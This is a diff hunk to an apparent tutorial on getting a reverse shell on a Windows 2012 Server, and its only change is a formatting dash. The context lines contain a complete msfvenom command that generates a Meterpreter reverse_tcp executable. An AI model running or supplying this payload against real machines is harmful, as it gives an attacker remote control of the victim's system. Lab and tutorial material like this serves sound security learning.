@@ -17,7 +17,7 @@ This is a demonstration of obtaining a reverse shell on a Windows 2012 Server. T
   
   # Step 2 : Create an exploit using msfvenom. To do so, you run the following command -
   -1 - sudo msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=8888 -f exe -o ~/Downloads/my_new_exploit.exe
-  And you should see the following output :
+  - And you should see the following output :
   
   ![image](https://user-images.githubusercontent.com/101802030/225945823-7e83ae7e-f211-4359-8b63-a72db0f21506.png)
 
